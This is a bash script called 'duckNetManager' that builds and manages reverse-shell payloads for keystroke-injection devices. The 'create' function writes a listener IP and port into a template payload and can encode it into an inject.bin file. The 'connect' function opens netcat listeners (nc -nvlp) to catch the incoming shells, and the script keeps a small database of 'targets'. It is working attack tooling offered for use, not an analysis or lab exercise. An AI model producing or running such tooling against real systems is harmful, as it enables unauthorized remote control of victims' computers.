#!/bin/bash
allowAbort=true;
myInterruptHandler()
{
    if $allowAbort; then
	echo
        echo -e "\n\033[1mYou terminated duckNetManager...\033[0m" && exit 1;
    fi;
}
trap myInterruptHandler SIGINT;
echo -e "\033[4m\033[1mWelcome to DuckNet Manager!!!\033[0m"
echo
echo -e "1]  Connect with target.\n2]  Create new target.\n3]  List available target.\n4]  Remove target.\n5]  Update target."
echo
read -p "Enter your choice: " ch
create () {
	read -p "Enter Target's name(without whitespaces): " name
	if [[ $(grep -oh "\w*$name\w*" ~/.config/duckNet/duckNet.db) == $name ]]; then
		echo -e "\033[0;31m\e[1mduckNetManager:Error:\e[0mName \"$name\" already exists."
		exit 1
	fi
	read -p "Enter Servers IP: " ip
	read -p "Enter Unique Port Number(1500-65535): " port
	if [[ $(grep -oh "\w*$ip\w*" ~/.config/duckNet/duckNet.db) == $ip ]] && [[ $(grep -oh "\w*$port\w*" ~/.config/duckNet/duckNet.db) == $port ]]; then
                echo -e "\033[0;31m\e[1mduckNetManager:Error:\e[0mTarget exist with similar IP address \"$ip\" and port number \"$port\"."
                exit 1
        fi
	max=65535
	min=1500
	read -p "Specify directory for output: " dir
	if [ ! -d "$dir" ]; then
  		echo -e "\033[0;31m\e[1mduckNetManager:Error:\e[0m\"$dir\" no such directory."
		exit 1
	else
		cp -r ~/.config/duckNet/payload $dir
	fi
	
	if [[ $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] && (( $port <= $max )) && (( $port >= $min )); then
  		sed -i -e "s/0.0.0.0/$ip/g" $dir/payload
		sed -i -e "s/4444/$port/g" $dir/payload
		echo -e "$(echo "$name"|xargs)\t$ip\t$port" >> ~/.config/duckNet/duckNet.db
		read -p "Do you want payload encoded(y|n): " enc
		if [ "$enc" = y ]
		then
			java -jar ~/.config/duckNet/Encoder/encoder.jar -i $dir/payload -o $dir/inject.bin
			rm $dir/payload
			echo -e "\033[0;32m\e[1mduckNetManager:Success:\e[0mCreated new Target \"$name\" with IP address \"$ip\" and Port number \"$port\"."
			exit 1
		fi
	else 
  		echo -e "\033[0;31m\e[1mduckNetManager:Error:\e[0mInvalid IP address \"$ip\" or Port number \"$port\"."
		exit 1
	fi

}
list () {
	
	column -t -o '  ' ~/.config/duckNet/duckNet.db | awk '{print NR" - "$0}'	
}
remove () {
	echo
	list
	echo
	read -p "Enter name of target to remove: " rmv
	if grep -q $rmv ~/.config/duckNet/duckNet.db; then
    		sed -i "/\b\($rmv\)\b/d" ~/.config/duckNet/duckNet.db
		echo -e "\033[0;32m\e[1mduckNetManager:Success:\e[0mRemoved \"$rmv\"."
	else
    		echo -e "\033[0;31m\e[1mduckNetManager:Error:\e[0m\"$rmv\" no such target found."
	fi
}
update () {
	echo
	list
	echo
	read -p "Choose target number: " cho
	read -p "You want to update (ip|port): " ent
	if [ "$ent" = ip ]
	then
		one=$(sed ""$cho\!d"" ~/.config/duckNet/duckNet.db | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}")
		read -p "Enter new ip: " use
		if [[ $use =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
			sed -i -e "$cho s/$one/$use/g" ~/.config/duckNet/duckNet.db
			echo -e "\033[0;32m\e[1mduckNetManager:Success:\e[0mUpdated IP."
		else
			echo -e "\033[0;31m\e[1mduckNetManager:Error:\e[0mInvalid IP address \"$use\"."
			exit
		fi
	elif [ "$ent" = port ]
	then
		two=$(sed ""$cho\!d"" ~/.config/duckNet/duckNet.db | awk '{print $ 3}')
		read -p "Enter new Port number: " useP
		max=65535
		min=1500
		if (( $useP <= $max )) && (( $useP >= $min )); then
			sed -i -e "$cho s/$two/$useP/g" ~/.config/duckNet/duckNet.db
			echo -e "\033[0;32m\e[1mduckNetManager:Success:\e[0mUpdated Port number\"$ent\"."
		else
			echo -e "\033[0;31m\e[1mduckNet:Error:\e[0mInvalid Port Number \"$useP\"."
		fi
	else
		echo -e "\033[0;31m\e[1mduckNetManager:Error:\e0m[Invalid choice \"$ent\"."
	fi
}
connect () {
	echo
	list
	echo
	read -p "Enter Target number to connect: " cho
	one=$(sed ""$cho\!d"" ~/.config/duckNet/duckNet.db | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}")
	two=$(sed ""$cho\!d"" ~/.config/duckNet/duckNet.db | awk '{print $ 3}')
	read -p "Do you want to listen on local address(y|n): " src
	if [ "$src" = n ]
	then
		echo -e "Listning on IP address \"$one\" and Port number \"$two\"...."
		nc -lv -s $one -p $two
	elif [ "$src" = y ]
	then
		echo -e "Listning on Port number \"$two\"...."
		nc -nvlp $two
	else
		echo -e "\033[0;31m\e[1mduckNetManager:Error:\e[0mInvalid choice \"$src\"."
	fi
}
if [ "$ch" = 1 ]
        then
                connect
elif [ "$ch" = 2 ]
        then
                create
elif [ "$ch" = 3 ]
        then
                list
elif [ "$ch" = 4 ]
        then
                remove
elif [ "$ch" = 5 ]
        then
                update
else
	echo -e "\033[0;31m\e[1mduckNet:Error:\e[0mInvalid choice \"$ch\"."
fi 
